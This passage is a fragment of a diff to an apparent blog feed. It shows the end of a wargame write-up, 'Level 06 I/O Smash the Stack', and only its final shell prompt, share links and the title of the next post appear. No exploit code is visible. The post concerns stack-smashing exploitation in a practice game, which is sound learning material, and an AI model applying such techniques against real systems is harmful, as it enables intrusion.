class=&quot;o&quot;&gt;(&lt;/span&gt;nosu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+sh-4.2&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;If you liked this post, you can
+&lt;a href=&quot;https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level06iosmash&amp;text=Level 06 I/O Smash the Stack&amp;via=alvaro_fe&quot;&gt;share it with your followers&lt;/a&gt;
+or
+&lt;a href=&quot;https://twitter.com/alvaro_fe&quot;&gt; follow me on Twitter&lt;/a&gt;!&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>How Linux Implements Generic List</title>
